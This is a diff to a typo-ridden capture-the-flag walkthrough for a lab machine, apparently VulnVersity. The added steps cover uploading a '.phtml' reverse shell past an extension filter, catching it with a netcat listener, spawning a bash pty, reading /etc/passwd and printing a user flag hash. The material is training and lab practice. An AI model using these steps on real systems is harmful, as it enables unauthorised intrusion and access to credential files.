@@ -87,7 +87,9 @@ Now we need t5o find wich extensio is allowed:
 Qustion:
  What extension is allowed after running the above exercise?
 answer:
-  run the ape.py the answer is   phtml
+  run the ape.py     (https://github.com/LegendSpam/VulnVersity/blob/main/ape.py)
+  
+  the answer is   phtml
 
  goto http://10.10.121.171:3333/internal/index.php
    and try to upload    'revershall.phtml'   and you'll get sucesss .
@@ -108,13 +110,28 @@ To gain remote access to this machine, follow these steps:
 
   a.  Opn the revershall.php file and edit the ip to be your local  tun0 ip
          you can find it in the output .  from  sudo ifconfig
-  b.  From  http://10.10.121.171:3333/internal/    Upload 'revershall.phtml'
+  b.  From  http://10.10.187.16:3333/internal/    Upload 'revershall.phtml'
   c.  check that the file is ploaded in http://10.10.239.131:3333/internal/uploads/ 
   d.  We're now going to listen to incoming connections using netcat. 
         Run the following command: nc -lvnp 9001.
   e.  run revershall.phtml'  from the 'internal/uploads/'  dir  
-  f in the trminal you can run command on the remote host
-https://youtu.be/hvYWCegfEZs?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=1142
+  f.  In the trminal you can run command on the remote host(  ls, whoami)
+  g.  In the terminal run : python -c "import pty; pty.spaw('/bin/bash')"
+  
+ --------------------------------------------- 
+  qusetion: What is the name of the user who manages the webserver? and the flag
+  a. run cat  etc/passwd
+   output list of users 
+    one user is :   bill:x:1000:1000:,,,:/home/bill:/bin/bash
+  b. cd /home/bill 
+     ls
+	 output : user.txt
+  c. cat 	user.txt 
+	 output :   8bd7992fbe8a6ad22a63361004cfcedb
+
+                        task 5:	 Privilege Escalation
+===============================================================================						
+https://youtu.be/hvYWCegfEZs?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=1282
 
 
 
